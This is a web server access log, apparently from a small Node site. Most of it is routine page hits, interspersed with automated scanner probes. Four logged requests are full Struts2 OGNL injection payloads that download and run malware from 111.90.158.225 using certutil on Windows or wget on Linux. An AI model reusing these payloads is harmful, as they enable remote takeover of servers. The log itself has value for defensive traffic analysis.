[0mGET / [32m200 [0m0.678 ms - 1455[0m
[0mGET / [32m200 [0m1.418 ms - 1455[0m
[0mGET / [32m200 [0m0.637 ms - 1455[0m
[0mGET / [32m200 [0m0.589 ms - 1455[0m
[0mGET / [32m200 [0m0.980 ms - 1455[0m
[0mGET / [32m200 [0m0.626 ms - 1455[0m
[0mGET / [32m200 [0m0.647 ms - 1455[0m
[0mGET / [32m200 [0m0.634 ms - 1455[0m
[0mGET / [32m200 [0m0.596 ms - 1455[0m
[0mGET / [32m200 [0m0.624 ms - 1455[0m
[0mGET / [32m200 [0m0.585 ms - 1455[0m
[0mGET / [32m200 [0m0.604 ms - 1455[0m
[0mGET / [32m200 [0m0.616 ms - 1455[0m
[0mGET / [32m200 [0m0.603 ms - 1455[0m
[0mGET / [32m200 [0m4.153 ms - 1455[0m
[0mGET / [32m200 [0m1.216 ms - 1455[0m
[0mGET / [32m200 [0m1.228 ms - 1455[0m
[0mGET / [32m200 [0m0.613 ms - 1455[0m
[0mGET / [32m200 [0m0.580 ms - 1455[0m
[0mGET / [32m200 [0m1.099 ms - 1455[0m
[0mGET / [32m200 [0m0.572 ms - 1455[0m
[0mGET / [32m200 [0m0.626 ms - 1455[0m
[0mGET / [32m200 [0m0.622 ms - 1455[0m
[0mGET / [32m200 [0m0.655 ms - 1455[0m
[0mGET /manager/html [33m404 [0m0.868 ms - 1642[0m
[0mGET / [32m200 [0m0.602 ms - 1455[0m
[0mGET / [32m200 [0m1.057 ms - 1455[0m
[0mGET / [32m200 [0m0.604 ms - 1455[0m
[0mGET / [32m200 [0m0.595 ms - 1455[0m
[0mGET / [32m200 [0m0.642 ms - 1455[0m
[0mGET / [32m200 [0m0.591 ms - 1455[0m
[0mGET / [32m200 [0m0.602 ms - 1455[0m
[0mGET / [32m200 [0m0.485 ms - 1455[0m
[0mGET / [32m200 [0m0.618 ms - 1455[0m
[0mGET / [32m200 [0m0.674 ms - 1455[0m
[0mGET / [32m200 [0m1.100 ms - 1455[0m
[0mPOST /tmUnblock.cgi [0m- [0m- ms - -[0m
[0mGET / [32m200 [0m0.653 ms - 1455[0m
[0mGET / [32m200 [0m1.655 ms - 1455[0m
[0mGET / [32m200 [0m0.618 ms - 1455[0m
[0mGET / [32m200 [0m0.538 ms - 1455[0m
[0mGET /robots.txt [33m404 [0m0.833 ms - 1642[0m
[0mGET /sitemap.xml [33m404 [0m0.864 ms - 1642[0m
[0mGET /.well-known/security.txt [33m404 [0m1.734 ms - 1642[0m
[0mGET /favicon.ico [33m404 [0m0.852 ms - 1642[0m
[0mGET / [32m200 [0m0.654 ms - 1455[0m
[0mGET / [32m200 [0m0.575 ms - 1455[0m
[0mGET / [32m200 [0m0.582 ms - 1455[0m
[0mPOST /phpmyadmin/index.php [33m404 [0m1.671 ms - 1637[0m
[0mGET / [32m200 [0m0.599 ms - 1455[0m
[0mGET / [32m200 [0m0.572 ms - 1455[0m
[0mGET / [32m200 [0m0.625 ms - 1455[0m
[0mGET / [32m200 [0m0.591 ms - 1455[0m
[0mGET / [32m200 [0m0.580 ms - 1455[0m
[0mGET / [32m200 [0m0.629 ms - 1455[0m
[0mPOST /phpmyadmin/index.php [33m404 [0m0.940 ms - 1637[0m
[0mGET / [36m304 [0m0.450 ms - -[0m
[0mGET /harryStyles.css [36m304 [0m0.306 ms - -[0m
[0mGET /harryJS.js [36m304 [0m0.316 ms - -[0m
[0mGET / [32m200 [0m0.647 ms - 1455[0m
[0mGET / [32m200 [0m0.594 ms - 1455[0m
[0mGET / [32m200 [0m0.623 ms - 1455[0m
[0mGET / [32m200 [0m0.575 ms - 1455[0m
[0mGET / [32m200 [0m0.593 ms - 1455[0m
[0mGET / [32m200 [0m0.603 ms - 1455[0m
[0mGET / [32m200 [0m0.606 ms - 1455[0m
[0mGET / [32m200 [0m0.562 ms - 1455[0m
[0mGET / [32m200 [0m0.631 ms - 1455[0m
[0mGET / [32m200 [0m0.657 ms - 1455[0m
[0mGET / [32m200 [0m0.596 ms - 1455[0m
[0mGET /manager/html [33m404 [0m3.409 ms - 1642[0m
[0mGET / [32m200 [0m0.633 ms - 1455[0m
[0mGET / [32m200 [0m1.109 ms - 1455[0m
[0mGET / [32m200 [0m0.584 ms - 1455[0m
[0mGET /ws_utc/resources/setting/options/general [33m404 [0m0.827 ms - 1642[0m
[0mPOST / [33m404 [0m1.082 ms - 1637[0m
[0mPOST / [33m404 [0m0.685 ms - 1637[0m
[0mPOST / [33m404 [0m0.739 ms - 1637[0m
[0mPOST / [33m404 [0m0.703 ms - 1637[0m
[0mGET /%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action [33m404 [0m2.601 ms - 1642[0m
[0mGET /%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action [33m404 [0m0.845 ms - 1642[0m
[0mGET /%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action [33m404 [0m0.893 ms - 1642[0m
[0mGET /%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action [33m404 [0m0.860 ms - 1642[0m
[0mGET /invoker/readonly [33m404 [0m0.802 ms - 1642[0m
[0mGET /invoker/JMXInvokerServlet [33m404 [0m0.808 ms - 1642[0m
[0mGET /jmx-console/HtmlAdaptor [33m404 [0m1.421 ms - 1642[0m
[0mGET /orders.xhtml [33m404 [0m0.789 ms - 1642[0m
[0mGET / [32m200 [0m0.574 ms - 1455[0m
[0mGET /users [32m200 [0m0.543 ms - 23[0m
[0mPUT /dbe_put1.jsp/ [33m404 [0m134.662 ms - 1637[0m
[0mGET /dbe_put1.jsp [33m404 [0m0.846 ms - 1642[0m
[0mGET /manager/html [33m404 [0m0.887 ms - 1642[0m
[0mGET /wls-wsat/CoordinatorPortType [33m404 [0m0.829 ms - 1642[0m
[0mGET / [32m200 [0m0.626 ms - 1455[0m
[0mGET / [32m200 [0m0.612 ms - 1455[0m
[0mGET / [32m200 [0m0.603 ms - 1455[0m
[0mGET / [32m200 [0m0.607 ms - 1455[0m
[0mGET / [32m200 [0m0.585 ms - 1455[0m
[0mGET / [32m200 [0m0.622 ms - 1455[0m
[0mGET / [32m200 [0m1.180 ms - 1455[0m
[0mGET /manager/html [33m404 [0m0.909 ms - 1642[0m
[0mGET / [32m200 [0m2.760 ms - 1455[0m
[0mGET / [32m200 [0m0.580 ms - 1455[0m
[0mGET / [32m200 [0m0.546 ms - 1455[0m
[0mGET /manager/html [33m404 [0m0.825 ms - 1642[0m
[0mGET / [32m200 [0m0.614 ms - 1455[0m
[0mGET / [32m200 [0m0.618 ms - 1455[0m
[0mGET / [32m200 [0m1.247 ms - 1455[0m
[0mGET / [32m200 [0m0.585 ms - 1455[0m
[0mGET / [32m200 [0m0.628 ms - 1455[0m
[0mGET / [32m200 [0m0.582 ms - 1455[0m
[0mGET / [32m200 [0m0.609 ms - 1455[0m
[0mGET / [32m200 [0m0.598 ms - 1455[0m
[0mGET / [32m200 [0m0.598 ms - 1455[0m
[0mGET / [32m200 [0m0.583 ms - 1455[0m
[0mGET / [32m200 [0m0.545 ms - 1455[0m
[0mGET / [32m200 [0m0.593 ms - 1455[0m
[0mGET / [32m200 [0m0.554 ms - 1455[0m
[0mGET / [32m200 [0m0.540 ms - 1455[0m
[0mGET / [32m200 [0m0.621 ms - 1455[0m
[0mGET / [32m200 [0m1.517 ms - 1455[0m
[0mGET / [32m200 [0m1.102 ms - 1455[0m
[0mGET / [32m200 [0m0.570 ms - 1455[0m
[0mGET / [32m200 [0m0.594 ms - 1455[0m
[0mGET / [32m200 [0m0.583 ms - 1455[0m
[0mGET / [32m200 [0m0.611 ms - 1455[0m
[0mGET / [32m200 [0m0.657 ms - 1455[0m
[0mGET / [32m200 [0m0.597 ms - 1455[0m
[0mGET / [32m200 [0m1.611 ms - 1455[0m
[0mGET / [32m200 [0m0.499 ms - 1455[0m
[0mGET / [32m200 [0m0.609 ms - 1455[0m
[0mGET / [32m200 [0m0.607 ms - 1455[0m
[0mGET / [32m200 [0m1.330 ms - 1455[0m
[0mGET / [32m200 [0m0.585 ms - 1455[0m
[0mGET / [32m200 [0m0.599 ms - 1455[0m
[0mGET / [32m200 [0m0.619 ms - 1455[0m
[0mGET / [32m200 [0m2.582 ms - 1455[0m
[0mGET / [32m200 [0m0.573 ms - 1455[0m
[0mGET / [32m200 [0m0.626 ms - 1455[0m
[0mGET / [32m200 [0m0.603 ms - 1455[0m
[0mGET / [32m200 [0m0.609 ms - 1455[0m
[0mGET / [32m200 [0m0.581 ms - 1455[0m
[0mGET / [32m200 [0m0.578 ms - 1455[0m
[0mGET / [32m200 [0m0.639 ms - 1455[0m
[0mGET / [32m200 [0m0.603 ms - 1455[0m
[0mGET / [32m200 [0m0.587 ms - 1455[0m
[0mGET / [32m200 [0m0.601 ms - 1455[0m
[0mGET / [32m200 [0m0.694 ms - 1455[0m
[0mGET / [32m200 [0m0.631 ms - 1455[0m
[0mGET / [32m200 [0m0.626 ms - 1455[0m
[0mGET / [32m200 [0m0.586 ms - 1455[0m
[0mGET /admin/connection/ [33m404 [0m0.860 ms - 1642[0m
[0mGET / [32m200 [0m0.605 ms - 1455[0m
[0mGET /home.asp [33m404 [0m0.853 ms - 1642[0m
[0mGET / [32m200 [0m0.624 ms - 1455[0m
[0mGET / [32m200 [0m0.560 ms - 1455[0m
[0mGET / [32m200 [0m0.564 ms - 1455[0m
[0mGET / [32m200 [0m0.647 ms - 1455[0m
[0mGET / [32m200 [0m0.551 ms - 1455[0m
[0mGET / [32m200 [0m0.953 ms - 1455[0m
[0mGET http://179.55.191.220:8269/o8s1jrwjovi29 [33m404 [0m0.869 ms - 1642[0m
[0mGET / [32m200 [0m0.636 ms - 1455[0m
[0mGET / [32m200 [0m0.603 ms - 1455[0m
[0mGET / [32m200 [0m0.600 ms - 1455[0m
[0mGET / [32m200 [0m0.598 ms - 1455[0m
[0mGET /manager/html [33m404 [0m0.830 ms - 1642[0m
[0mGET / [32m200 [0m0.617 ms - 1455[0m
[0mGET / [32m200 [0m2.230 ms - 1455[0m
[0mGET / [32m200 [0m0.589 ms - 1455[0m
[0mGET / [32m200 [0m2.715 ms - 1455[0m
[0mGET / [32m200 [0m0.464 ms - 1455[0m
[0mGET / [32m200 [0m0.559 ms - 1455[0m
[0mGET / [32m200 [0m0.589 ms - 1455[0m
[0mGET / [32m200 [0m0.666 ms - 1455[0m
[0mGET / [32m200 [0m0.647 ms - 1455[0m
[0mGET / [32m200 [0m0.635 ms - 1455[0m
[0mGET /manager/html [33m404 [0m0.933 ms - 1642[0m
[0mGET / [32m200 [0m0.553 ms - 1455[0m
[0mGET / [32m200 [0m0.604 ms - 1455[0m
[0mGET / [32m200 [0m0.637 ms - 1455[0m
[0mGET / [32m200 [0m1.079 ms - 1455[0m
[0mGET / [32m200 [0m0.603 ms - 1455[0m
[0mGET / [32m200 [0m0.604 ms - 1455[0m
[0mGET / [32m200 [0m0.617 ms - 1455[0m
[0mGET / [32m200 [0m0.571 ms - 1455[0m
[0mGET / [32m200 [0m0.635 ms - 1455[0m
[0mGET / [32m200 [0m0.568 ms - 1455[0m
[0mGET / [32m200 [0m0.576 ms - 1455[0m
[0mGET / [32m200 [0m1.155 ms - 1455[0m
[0mGET / [32m200 [0m0.593 ms - 1455[0m
[0mGET / [32m200 [0m0.599 ms - 1455[0m
[0mGET / [32m200 [0m0.633 ms - 1455[0m
[0mGET / [32m200 [0m0.572 ms - 1455[0m
[0mGET / [32m200 [0m0.617 ms - 1455[0m
[0mGET / [32m200 [0m0.660 ms - 1455[0m
[0mGET / [32m200 [0m0.631 ms - 1455[0m
[0mGET / [32m200 [0m0.600 ms - 1455[0m
[0mGET / [32m200 [0m0.625 ms - 1455[0m
[0mPOST /tmUnblock.cgi [33m404 [0m5.652 ms - 1637[0m
[0mGET /tmUnblock.cgi [33m404 [0m0.810 ms - 1642[0m
[0mGET http://journalseek.net/ [32m200 [0m0.607 ms - 1455[0m
[0mGET / [32m200 [0m0.668 ms - 1455[0m
[0mGET /manager/html [33m404 [0m0.777 ms - 1642[0m
[0mGET / [32m200 [0m0.631 ms - 1455[0m
[0mGET / [32m200 [0m0.655 ms - 1455[0m
[0mGET / [32m200 [0m0.614 ms - 1455[0m
[0mGET / [32m200 [0m2.946 ms - 1455[0m
[0mGET http://www.pnas.org/ [32m200 [0m0.560 ms - 1455[0m
[0mGET / [32m200 [0m0.591 ms - 1455[0m
[0mGET / [32m200 [0m0.609 ms - 1455[0m
[0mGET / [32m200 [0m0.478 ms - 1455[0m
[0mGET / [32m200 [0m0.555 ms - 1455[0m
[0mGET / [32m200 [0m0.679 ms - 1455[0m
[0mGET / [32m200 [0m0.597 ms - 1455[0m
[0mGET / [32m200 [0m0.579 ms - 1455[0m
[0mGET / [32m200 [0m0.569 ms - 1455[0m
[0mGET / [32m200 [0m0.578 ms - 1455[0m
[0mGET / [32m200 [0m0.591 ms - 1455[0m
[0mGET / [32m200 [0m0.584 ms - 1455[0m
[0mGET / [32m200 [0m0.595 ms - 1455[0m
[0mGET / [32m200 [0m0.589 ms - 1455[0m
[0mGET / [32m200 [0m0.775 ms - 1455[0m
[0mGET / [32m200 [0m0.624 ms - 1455[0m
[0mGET / [32m200 [0m0.578 ms - 1455[0m
[0mGET / [32m200 [0m0.604 ms - 1455[0m
[0mGET / [32m200 [0m0.611 ms - 1455[0m
[0mGET / [32m200 [0m0.603 ms - 1455[0m
[0mGET / [32m200 [0m0.584 ms - 1455[0m
[0mGET / [32m200 [0m0.617 ms - 1455[0m
[0mGET / [32m200 [0m0.567 ms - 1455[0m
[0mGET / [32m200 [0m0.630 ms - 1455[0m
[0mGET / [32m200 [0m0.601 ms - 1455[0m
[0mGET / [32m200 [0m1.047 ms - 1455[0m
[0mGET / [32m200 [0m0.708 ms - 1455[0m
[0mGET / [32m200 [0m0.585 ms - 1455[0m
[0mGET / [32m200 [0m0.573 ms - 1455[0m
[0mGET / [32m200 [0m0.769 ms - 1455[0m
[0mGET / [32m200 [0m4.534 ms - 1455[0m
[0mGET / [32m200 [0m0.576 ms - 1455[0m
[0mGET /RELEASE-NOTES.txt [33m404 [0m0.818 ms - 1642[0m
[0mGET / [32m200 [0m4.000 ms - 1455[0m
[0mGET / [32m200 [0m0.578 ms - 1455[0m
[0mGET / [32m200 [0m0.563 ms - 1455[0m
[0mGET / [32m200 [0m0.605 ms - 1455[0m
[0mGET / [32m200 [0m0.565 ms - 1455[0m
[0mGET / [32m200 [0m0.569 ms - 1455[0m
[0mGET / [32m200 [0m0.659 ms - 1455[0m
[0mGET / [32m200 [0m0.589 ms - 1455[0m
[0mGET / [32m200 [0m1.112 ms - 1455[0m
[0mGET /struts2-rest-showcase/orders.xhtml [33m404 [0m0.848 ms - 1642[0m
[0mGET /index.action [33m404 [0m1.179 ms - 1642[0m
[0mGET /index.do [33m404 [0m0.809 ms - 1642[0m
[0mGET / [32m200 [0m0.582 ms - 1455[0m
[0mGET / [32m200 [0m0.609 ms - 1455[0m
[0mGET / [32m200 [0m0.791 ms - 1455[0m
[0mGET / [32m200 [0m0.444 ms - 1455[0m
[0mGET / [32m200 [0m0.566 ms - 1455[0m
[0mGET / [32m200 [0m0.576 ms - 1455[0m
[0mGET / [32m200 [0m5.058 ms - 1455[0m
[0mGET / [32m200 [0m0.598 ms - 1455[0m
[0mGET / [32m200 [0m0.591 ms - 1455[0m
[0mGET / [32m200 [0m0.569 ms - 1455[0m
[0mGET / [32m200 [0m0.605 ms - 1455[0m
[0mGET / [32m200 [0m0.540 ms - 1455[0m
[0mGET / [32m200 [0m0.600 ms - 1455[0m
[0mGET / [32m200 [0m0.554 ms - 1455[0m
[0mGET / [32m200 [0m0.574 ms - 1455[0m
[0mGET / [32m200 [0m0.577 ms - 1455[0m
[0mGET / [32m200 [0m0.587 ms - 1455[0m
[0mGET / [32m200 [0m0.590 ms - 1455[0m
[0mGET / [32m200 [0m0.579 ms - 1455[0m
[0mGET / [32m200 [0m0.713 ms - 1455[0m
[0mGET / [32m200 [0m0.607 ms - 1455[0m
[0mGET / [32m200 [0m0.610 ms - 1455[0m
[0mGET / [32m200 [0m0.585 ms - 1455[0m
[0mGET / [32m200 [0m0.588 ms - 1455[0m
[0mGET / [32m200 [0m0.634 ms - 1455[0m
[0mGET / [32m200 [0m0.574 ms - 1455[0m
[0mGET / [32m200 [0m0.583 ms - 1455[0m
[0mGET / [32m200 [0m0.617 ms - 1455[0m
[0mGET / [32m200 [0m0.587 ms - 1455[0m
[0mGET /manager/html [33m404 [0m0.859 ms - 1642[0m
[0mGET / [32m200 [0m0.633 ms - 1455[0m
[0mGET / [32m200 [0m0.584 ms - 1455[0m
[0mGET / [32m200 [0m0.600 ms - 1455[0m
[0mGET / [32m200 [0m0.611 ms - 1455[0m
[0mGET / [32m200 [0m0.570 ms - 1455[0m
[0mPOST /zabbix/index.php [33m404 [0m277.475 ms - 1637[0m
[0mGET / [32m200 [0m0.601 ms - 1455[0m
[0mGET /manager/html [33m404 [0m0.839 ms - 1642[0m
[0mGET / [32m200 [0m0.577 ms - 1455[0m
[0mGET / [32m200 [0m0.622 ms - 1455[0m
[0mGET / [32m200 [0m0.612 ms - 1455[0m
[0mGET / [32m200 [0m0.641 ms - 1455[0m
[0mGET / [32m200 [0m0.584 ms - 1455[0m
[0mGET http://5.188.210.12/echo.php [33m404 [0m1.049 ms - 1642[0m
[0mGET / [32m200 [0m0.621 ms - 1455[0m
[0mGET / [32m200 [0m0.583 ms - 1455[0m
[0mGET / [32m200 [0m0.567 ms - 1455[0m
[0mGET / [32m200 [0m0.588 ms - 1455[0m
[0mGET / [32m200 [0m0.643 ms - 1455[0m
[0mGET /manager/html [33m404 [0m0.862 ms - 1642[0m
[0mGET / [32m200 [0m0.584 ms - 1455[0m
[0mGET /manager/html [33m404 [0m0.788 ms - 1642[0m
[0mGET / [32m200 [0m0.549 ms - 1455[0m
[0mGET / [32m200 [0m2.445 ms - 1455[0m
[0mGET / [32m200 [0m0.896 ms - 1455[0m
[0mGET / [32m200 [0m0.742 ms - 1455[0m
[0mGET / [32m200 [0m0.823 ms - 1455[0m
[0mGET / [32m200 [0m0.654 ms - 1455[0m
[0mGET / [32m200 [0m0.633 ms - 1455[0m
[0mGET / [32m200 [0m0.683 ms - 1455[0m
[0mGET /manager/html [33m404 [0m5.107 ms - 1642[0m
[0mGET / [32m200 [0m0.656 ms - 1455[0m
[0mGET / [32m200 [0m0.643 ms - 1455[0m
[0mGET / [32m200 [0m0.572 ms - 1455[0m
[0mGET / [32m200 [0m1.354 ms - 1455[0m
[0mGET / [32m200 [0m0.617 ms - 1455[0m
[0mGET / [32m200 [0m0.661 ms - 1455[0m
[0mGET / [32m200 [0m0.651 ms - 1455[0m
[0mGET / [32m200 [0m0.632 ms - 1455[0m
[0mGET / [32m200 [0m0.643 ms - 1455[0m
[0mGET / [32m200 [0m0.592 ms - 1455[0m
[0mGET /HNAP1/ [33m404 [0m1.054 ms - 1642[0m
[0mGET / [32m200 [0m0.604 ms - 1455[0m
[0mGET / [32m200 [0m0.624 ms - 1455[0m
[0mGET / [32m200 [0m0.599 ms - 1455[0m
[0mGET / [32m200 [0m0.629 ms - 1455[0m
[0mGET / [32m200 [0m0.578 ms - 1455[0m
[0mGET / [32m200 [0m0.642 ms - 1455[0m
[0mGET / [32m200 [0m0.674 ms - 1455[0m
[0mGET / [32m200 [0m1.051 ms - 1455[0m
[0mGET / [32m200 [0m0.629 ms - 1455[0m
[0mGET / [32m200 [0m0.644 ms - 1455[0m
[0mGET / [32m200 [0m0.661 ms - 1455[0m
[0mGET / [32m200 [0m0.601 ms - 1455[0m
[0mGET /manager/html [33m404 [0m0.894 ms - 1642[0m
[0mGET http://www.123cha.com [32m200 [0m0.639 ms - 1455[0m
[0mGET http://api.ipify.org/ [32m200 [0m0.612 ms - 1455[0m
[0mGET http://www.123cha.com/ [32m200 [0m1.044 ms - 1455[0m
[0mGET http://www.minghui.org/ [0m- [0m- ms - -[0m
[0mGET http://boxun.com/ [0m- [0m- ms - -[0m
[0mGET http://www.rfa.org/english/ [0m- [0m- ms - -[0m
[0mGET http://www.ip.cn/ [32m200 [0m0.611 ms - 1455[0m
[0mGET http://www.wujieliulan.com/ [0m- [0m- ms - -[0m
[0mGET http://www.epochtimes.com/ [0m- [0m- ms - -[0m
[0mGET / [32m200 [0m0.575 ms - 1455[0m
[0mGET / [32m200 [0m0.628 ms - 1455[0m
[0mGET / [32m200 [0m0.583 ms - 1455[0m
[0mGET /manager/html [33m404 [0m0.844 ms - 1642[0m
[0mGET / [32m200 [0m0.692 ms - 1455[0m
[0mGET / [32m200 [0m0.654 ms - 1455[0m
[0mGET / [32m200 [0m3.395 ms - 1455[0m
[0mGET / [32m200 [0m0.641 ms - 1455[0m
[0mGET / [32m200 [0m0.716 ms - 1455[0m
[0mGET / [32m200 [0m0.643 ms - 1455[0m
[0mGET / [32m200 [0m0.724 ms - 1455[0m
[0mGET / [32m200 [0m0.617 ms - 1455[0m
[0mGET / [32m200 [0m0.626 ms - 1455[0m
[0mGET / [32m200 [0m0.650 ms - 1455[0m
[0mGET / [32m200 [0m0.583 ms - 1455[0m
[0mGET /manager/html [33m404 [0m1.293 ms - 1642[0m
[0mGET / [32m200 [0m0.635 ms - 1455[0m
[0mGET / [32m200 [0m0.603 ms - 1455[0m
[0mGET / [32m200 [0m0.585 ms - 1455[0m
[0mGET / [32m200 [0m0.666 ms - 1455[0m
[0mGET / [32m200 [0m0.607 ms - 1455[0m
[0mGET / [32m200 [0m0.606 ms - 1455[0m
[0mGET / [32m200 [0m0.645 ms - 1455[0m
[0mGET / [32m200 [0m0.663 ms - 1455[0m
[0mGET / [32m200 [0m0.948 ms - 1455[0m
[0mGET / [32m200 [0m0.642 ms - 1455[0m
[0mGET / [32m200 [0m0.455 ms - 1455[0m
[0mGET / [32m200 [0m0.774 ms - 1455[0m
[0mGET / [32m200 [0m2.000 ms - 1455[0m
[0mGET / [32m200 [0m0.634 ms - 1455[0m
[0mGET / [32m200 [0m0.563 ms - 1455[0m
[0mGET / [32m200 [0m0.629 ms - 1455[0m
[0mGET / [32m200 [0m0.488 ms - 1455[0m
[0mGET / [32m200 [0m0.481 ms - 1455[0m
[0mGET / [32m200 [0m1.011 ms - 1455[0m
[0mGET / [32m200 [0m0.611 ms - 1455[0m
[0mGET / [32m200 [0m0.619 ms - 1455[0m
[0mGET / [32m200 [0m1.031 ms - 1455[0m
[0mGET /manager/html [33m404 [0m1.307 ms - 1642[0m
[0mGET / [32m200 [0m0.646 ms - 1455[0m
[0mPOST /tmUnblock.cgi [33m404 [0m1.259 ms - 1637[0m
[0mGET / [32m200 [0m0.642 ms - 1455[0m
[0mGET / [32m200 [0m0.625 ms - 1455[0m
[0mGET / [32m200 [0m0.598 ms - 1455[0m
[0mGET / [32m200 [0m0.596 ms - 1455[0m
[0mGET / [32m200 [0m0.626 ms - 1455[0m
[0mGET / [32m200 [0m0.581 ms - 1455[0m
[0mGET / [32m200 [0m0.592 ms - 1455[0m
[0mGET / [32m200 [0m0.617 ms - 1455[0m
[0mGET / [32m200 [0m0.626 ms - 1455[0m
[0mGET /manager/html [33m404 [0m0.825 ms - 1642[0m
[0mGET / [32m200 [0m0.648 ms - 1455[0m
[0mGET / [32m200 [0m0.624 ms - 1455[0m
[0mGET / [32m200 [0m0.571 ms - 1455[0m
[0mGET / [32m200 [0m0.609 ms - 1455[0m
[0mGET / [32m200 [0m0.589 ms - 1455[0m
[0mGET /manager/html [33m404 [0m0.834 ms - 1642[0m
[0mGET / [32m200 [0m0.609 ms - 1455[0m
[0mGET / [32m200 [0m0.649 ms - 1455[0m
[0mGET / [32m200 [0m0.601 ms - 1455[0m
[0mGET / [32m200 [0m0.658 ms - 1455[0m
[0mGET / [32m200 [0m0.620 ms - 1455[0m
[0mGET / [32m200 [0m0.657 ms - 1455[0m
[0mGET / [32m200 [0m0.606 ms - 1455[0m
[0mGET / [32m200 [0m1.060 ms - 1455[0m
[0mGET / [32m200 [0m0.608 ms - 1455[0m
[0mGET / [32m200 [0m0.621 ms - 1455[0m
[0mGET / [32m200 [0m0.541 ms - 1455[0m
[0mGET / [32m200 [0m0.714 ms - 1455[0m
[0mGET / [32m200 [0m0.659 ms - 1455[0m
[0mGET / [32m200 [0m0.630 ms - 1455[0m
[0mGET / [32m200 [0m0.667 ms - 1455[0m
[0mGET / [32m200 [0m0.879 ms - 1455[0m
[0mGET / [32m200 [0m2.016 ms - 1455[0m
[0mGET / [32m200 [0m0.840 ms - 1455[0m
[0mGET / [32m200 [0m0.569 ms - 1455[0m
[0mGET /manager/html [33m404 [0m0.872 ms - 1642[0m
[0mGET /manager/html [33m404 [0m0.846 ms - 1642[0m
[0mGET / [32m200 [0m0.909 ms - 1455[0m
[0mGET /manager/html [33m404 [0m0.851 ms - 1642[0m
[0mGET / [32m200 [0m0.947 ms - 1455[0m
[0mGET / [32m200 [0m1.185 ms - 1455[0m
[0mGET / [32m200 [0m0.612 ms - 1455[0m
[0mGET / [32m200 [0m0.653 ms - 1455[0m
[0mGET / [32m200 [0m0.573 ms - 1455[0m
[0mGET / [32m200 [0m0.624 ms - 1455[0m
[0mGET / [32m200 [0m0.612 ms - 1455[0m
[0mGET / [32m200 [0m0.585 ms - 1455[0m
[0mGET / [32m200 [0m0.713 ms - 1455[0m
[0mGET / [32m200 [0m1.142 ms - 1455[0m
[0mGET / [32m200 [0m0.963 ms - 1455[0m
[0mGET /manager/html [33m404 [0m0.849 ms - 1642[0m
[0mGET /manager/html [33m404 [0m0.833 ms - 1642[0m
[0mGET / [32m200 [0m0.599 ms - 1455[0m
[0mGET / [32m200 [0m0.630 ms - 1455[0m
[0mGET / [32m200 [0m0.634 ms - 1455[0m
[0mGET /script [33m404 [0m0.895 ms - 1642[0m
[0mGET / [32m200 [0m0.647 ms - 1455[0m
[0mGET / [32m200 [0m1.068 ms - 1455[0m
[0mGET /manager/html [33m404 [0m0.841 ms - 1642[0m
[0mGET / [32m200 [0m0.601 ms - 1455[0m
[0mGET / [32m200 [0m0.634 ms - 1455[0m
[0mGET / [32m200 [0m0.606 ms - 1455[0m
[0mGET / [32m200 [0m0.671 ms - 1455[0m
[0mGET / [32m200 [0m0.599 ms - 1455[0m
[0mGET / [32m200 [0m0.645 ms - 1455[0m
[0mGET / [32m200 [0m1.186 ms - 1455[0m
[0mGET / [32m200 [0m1.920 ms - 1455[0m
